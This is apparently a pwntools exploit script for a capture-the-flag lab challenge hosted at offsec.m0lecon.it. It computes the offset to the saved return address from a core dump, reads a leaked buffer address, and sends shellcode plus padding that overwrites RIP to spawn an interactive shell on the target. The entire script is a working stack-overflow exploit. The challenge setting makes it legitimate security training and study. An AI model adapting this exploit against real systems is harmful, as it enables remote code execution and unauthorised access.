from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13552

elf = ELF('/home/kali/Desktop/offsec/labs/lab1/materiale/challenges/01-whispered-secrets/whispered_secrets')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"secret:\n")
    p_crash.sendline(cyclic(1024))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)    #0x6261616a
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

r = conn()

leak_line = r.recvline_contains(b"secret:")
buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
log.info(f"buf = {buf_addr:#x}")

shellcode = asm(shellcraft.sh())

payload = flat(
shellcode,
b"A" * (OFFSET_TO_RIP - len(shellcode)),
p64(buf_addr) # where to jump?
)

r.sendafter(b"secret:\n", payload)
r.interactive()